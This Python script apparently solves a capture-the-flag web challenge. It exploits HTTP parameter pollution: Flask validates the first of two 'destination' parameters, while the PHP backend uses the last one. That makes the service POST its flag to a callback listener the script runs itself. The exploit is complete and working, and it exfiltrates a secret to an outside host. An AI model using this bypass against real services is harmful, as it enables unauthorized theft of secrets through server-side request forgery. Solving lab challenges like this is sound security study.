import http.server
import os
import socket
import sys
import threading

import requests

HOST = os.environ["SERVICE_APP_MAIN_HOST"]
PORT = int(os.environ["SERVICE_APP_MAIN_PORT"])

# The PHP backend (service.php) POSTs the flag to whatever "destination" URL
# we give it, so we stand up a tiny local HTTP server to receive that POST.
captured = {}
received = threading.Event()


class CollectorHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        captured["body"] = body.decode(errors="replace")
        received.set()
        self.send_response(200)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


def local_reachable_ip():
    # Determine the IP the challenge pod would use to route back to us by
    # asking the kernel which local address it would pick for a route to the
    # challenge service (no packets are actually sent, it's UDP + connect()).
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((HOST, PORT))
        return s.getsockname()[0]
    finally:
        s.close()


server = http.server.HTTPServer(("0.0.0.0", 0), CollectorHandler)
listen_port = server.server_address[1]
server_thread = threading.Thread(target=server.serve_forever, daemon=True)
server_thread.start()

local_ip = local_reachable_ip()
callback_url = f"http://{local_ip}:{listen_port}/collect"

print(f"[*] Target service: http://{HOST}:{PORT}")
print(f"[*] Local callback listener: {callback_url}")

# HTTP Parameter Pollution:
# - Flask's /sendFlag reads only the FIRST "destination" param and validates
#   it is http(s)://127.0.0.1 or localhost (and not port 5000/8000).
# - Flask then forwards the *full* query string (both "destination" params)
#   to the PHP backend on localhost:8000.
# - PHP's $_GET['destination'] keeps only the LAST value for a repeated key,
#   so it uses our attacker-controlled callback URL to POST the flag to us.
params = [
    ("destination", "http://127.0.0.1:9000"),  # passes Flask's validation
    ("destination", callback_url),  # actually used by PHP
]

url = f"http://{HOST}:{PORT}/sendFlag"
resp = requests.get(url, params=params, timeout=10)
print(f"[*] Response from service: {resp.status_code} {resp.text}")

if not received.wait(timeout=15):
    print("[-] Never received a callback with the flag.")
    server.shutdown()
    sys.exit(1)

server.shutdown()

flag = captured.get("body", "")
print(f"[+] Captured flag: {flag}")
